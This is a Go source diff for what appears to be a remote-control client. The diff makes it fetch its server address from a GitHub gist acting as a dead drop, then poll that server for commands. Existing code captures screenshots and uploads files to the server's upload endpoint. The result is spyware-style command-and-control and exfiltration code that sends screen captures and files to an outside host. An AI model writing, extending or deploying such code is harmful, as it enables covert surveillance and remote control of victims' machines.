@@ -9,24 +9,45 @@ import (
 	"strconv"
 	"strings"
 	"time"
-
+	"sync"
 	"github.com/vova616/screenshot"
 )
 
-var serverIp string = "http://10.0.2.2:10000"
+var serverIp string = "unknown"
 var userInput string = ""
+var mutex sync.Mutex
+
+func fetchTunnelURL() string {
+    resp, err := http.Get("https://gist.githubusercontent.com/Plexisity/c4748adcea3ad83d87cd8eba959f2fd3/raw/tunnel.txt")
+    if err != nil {
+        fmt.Println("Error fetching gist:", err)
+        return ""
+    }
+    defer resp.Body.Close()
+
+    body, err := io.ReadAll(resp.Body)
+    if err != nil {
+        fmt.Println("Error reading gist:", err)
+        return ""
+    }
+
+    return strings.TrimSpace(string(body))
+}
 
 func ss() {
 	img, err := screenshot.CaptureScreen()
 	if err != nil {
+		fmt.Println("Error capturing screenshot:", err)
 		panic(err)
 	}
 	f, err := os.Create("./ss.webp")
 	if err != nil {
+		fmt.Println("Error creating file:", err)
 		panic(err)
 	}
 	err = png.Encode(f, img)
 	if err != nil {
+		fmt.Println("Error encoding PNG:", err)
 		panic(err)
 	}
 	f.Close()
@@ -40,8 +61,8 @@ func sendFile(filePath string, mediaType string) string {
 	}
 	defer file.Close()
 
-	// Prepare the network request targeting Machine A's IP address
-	targetURL := "http://10.0.2.2:10000/upload"
+	// Prepare the network request targeting the cloudflare ip
+	targetURL := serverIp + "/upload"
 	req, err := http.NewRequest("POST", targetURL, file)
 	if err != nil {
 		panic(err)
@@ -88,6 +109,15 @@ func playSound() {
 }
 
 func main() {
+	fmt.Println("Finding tunnel URL...")
+	tunnelURL := fetchTunnelURL()	
+	mutex.Lock()
+	serverIp = tunnelURL
+	mutex.Unlock()
+
+	fmt.Println("Tunnel URL fetched:", tunnelURL)
+	fmt.Println("Starting command client...")
+
 	for true {
 		userInput = fetchCommand()
 		command := strings.Fields(userInput)
